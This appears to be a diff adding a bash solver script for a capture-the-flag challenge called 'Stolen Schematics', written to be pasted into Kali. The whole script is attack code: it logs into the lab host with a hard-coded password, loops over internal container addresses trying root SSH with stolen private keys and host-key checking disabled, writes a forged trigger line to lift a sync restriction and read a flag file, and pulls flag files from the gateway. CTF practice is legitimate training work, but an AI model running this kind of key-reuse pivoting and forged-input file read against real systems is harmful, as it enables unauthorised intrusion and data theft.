@@ -1,0 +1,40 @@
+# QUICK STOLEN SCHEMATICS SOLVER - PASTE THIS IN KALI
+
+sshpass -p "reyalp" ssh -o StrictHostKeyChecking=no -p 32887 player@instance.ctf.tdho.st << 'EOF'
+
+echo "=== QUICK PIVOT SCAN ==="
+
+# Show network
+ip addr | grep "inet "
+
+# Set key permissions
+chmod 600 /tmp/key_*.pem 2>/dev/null
+
+# Quick manual SSH brute (faster than python script)
+echo ""
+echo "[*] Testing SSH access to all containers..."
+
+for ip in 172.27.0.1 172.27.0.2 172.27.0.4 172.27.0.5 172.27.0.6 172.27.0.7 172.27.0.8 172.27.0.9 172.27.0.10; do
+    # Try key_1
+    timeout 1 ssh -i /tmp/key_1.pem -o StrictHostKeyChecking=no -o ConnectTimeout=1 \
+        root@$ip "hostname; whoami; ls -la /opt/mc/.sync/ 2>/dev/null; echo 'FILE-READ:/etc/flag.txt?talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true' > /opt/mc/.sync/sync.trigger 2>/dev/null; sleep 2; cat /opt/mc/sync.log /etc/flag.txt 2>/dev/null | grep -i TDHT" 2>/dev/null && echo "[+++] ROOT ACCESS WITH KEY_1 ON $ip"
+    
+    # Try key_2
+    timeout 1 ssh -i /tmp/key_2.pem -o StrictHostKeyChecking=no -o ConnectTimeout=1 \
+        root@$ip "hostname; whoami; ls -la /opt/mc/.sync/ 2>/dev/null; echo 'FILE-READ:/etc/flag.txt?talldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true' > /opt/mc/.sync/sync.trigger 2>/dev/null; sleep 2; cat /opt/mc/sync.log /etc/flag.txt 2>/dev/null | grep -i TDHT" 2>/dev/null && echo "[+++] ROOT ACCESS WITH KEY_2 ON $ip"
+done
+
+echo ""
+echo "[*] Checking current container for watcher..."
+ps aux | grep -i watch
+ls -la /opt/mc/.sync/ 2>/dev/null
+
+echo ""
+echo "[*] Checking if we can read flag directly from gateway..."
+timeout 2 ssh -i /tmp/key_1.pem -o StrictHostKeyChecking=no root@172.27.0.1 "cat /etc/flag.txt /flag.txt /root/flag.txt 2>/dev/null" 2>/dev/null
+timeout 2 ssh -i /tmp/key_2.pem -o StrictHostKeyChecking=no root@172.27.0.1 "cat /etc/flag.txt /flag.txt /root/flag.txt 2>/dev/null" 2>/dev/null
+
+echo ""
+echo "=== SCAN COMPLETE ==="
+
+EOF
